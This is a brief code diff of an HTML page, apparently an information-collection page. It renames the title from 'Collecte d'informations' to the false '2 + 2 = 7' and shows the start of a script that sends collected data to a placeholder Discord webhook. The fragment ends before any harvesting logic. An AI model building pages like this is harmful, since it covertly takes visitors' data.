@@ -1,6 +1,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Collecte d'informations</title>
+<title>2 + 2 = 7</title>
 <script>
   async function sendWebhook(data) {
     const webhookURL = 'YOUR DISCORD WEBHOOK HERE';
